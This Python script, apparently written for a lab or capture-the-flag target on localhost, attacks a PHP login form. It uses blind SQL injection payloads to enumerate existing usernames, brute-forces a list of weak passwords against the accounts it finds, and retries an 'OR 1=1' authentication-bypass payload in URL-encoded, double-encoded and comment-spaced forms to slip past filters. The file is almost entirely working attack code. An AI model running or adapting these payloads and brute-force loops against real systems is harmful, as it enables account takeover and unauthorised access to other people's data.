import requests
import string

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

print("[*] Blind SQLi: Checking for other user accounts")
print("="*60)

# Common usernames to test
usernames_to_test = [
    'admin', 'administrator', 'root', 'user', 'test', 'demo', 'guest',
    'bob', 'alice', 'john', 'jane', 'mike', 'mary', 'sarah', 'david',
    'admin1', 'admin2', 'user1', 'user2', 'test1', 'test2',
    'paybuddy', 'buddy', 'pay', 'payment', 'finance', 'money'
]

print("\n[*] Testing for existence of user accounts...")

existing_users = []

for test_user in usernames_to_test:
    # Check if this username exists
    payload = f"{test_user}' AND '1'='1"
    data = {
        "username": payload,
        "password": "test",
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        
        # If we get "password" response, the user exists
        if response.text == '{"response":"password"}':
            print(f"[+] User exists: {test_user}")
            existing_users.append(test_user)
            
    except Exception as e:
        print(f"[-] Error testing {test_user}: {e}")

if existing_users:
    print(f"\n[+] Found {len(existing_users)} existing users: {existing_users}")
else:
    print("\n[-] No additional users found besides 'admin'")

print("\n[*] Trying weak password attack on found users")
print("="*60)

# Try weak passwords for each found user
weak_passwords = [
    'password', 'Password', 'PASSWORD', 'password123',
    '123456', '12345678', 'qwerty', 'admin', 'test',
    '', 'pass', 'letmein', '1234', '12345', 'welcome',
    'admin123', 'test123', 'demo123', 'user123'
]

for user in existing_users:
    print(f"\n[*] Testing weak passwords for user: {user}")
    
    for pwd in weak_passwords:
        data = {
            "username": user,
            "password": pwd,
            "submit": "submit"
        }
        
        try:
            response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            
            # Check for success
            if response.text not in ['{"response":"username"}', '{"response":"password"}']:
                print(f"\n[!] DIFFERENT RESPONSE for {user}:{pwd}")
                print(f"    Response: {response.text}")
                
                if "Success" in response.text or "success" in response.text.lower():
                    print(f"[!] LOGIN SUCCESSFUL with {user}:{pwd}")
                    if response.cookies:
                        print(f"[!] Cookies: {response.cookies.get_dict()}")
                    break
                    
        except Exception as e:
            print(f"[-] Error: {e}")

print("\n[*] Testing for SQL injection encoding bypass")
print("="*60)

# Try URL encoding, double encoding
import urllib.parse

basic_sqli = "admin' OR '1'='1-- "

encodings = [
    basic_sqli,
    urllib.parse.quote(basic_sqli),  # URL encode
    urllib.parse.quote(urllib.parse.quote(basic_sqli)),  # Double encode
    basic_sqli.replace(" ", "/**/"),  # Comment spaces
    basic_sqli.replace("'", "''"),  # Escape quotes
    basic_sqli.replace(" ", "%20"),  # Space to %20
]

for encoded_payload in encodings:
    data = {
        "username": encoded_payload,
        "password": "anything",
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        
        if response.text != '{"response":"password"}' and response.text != '{"response":"username"}':
            print(f"\n[+] Different response with encoding:")
            print(f"    Payload: {encoded_payload[:60]}...")
            print(f"    Response: {response.text}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n[*] Script complete")

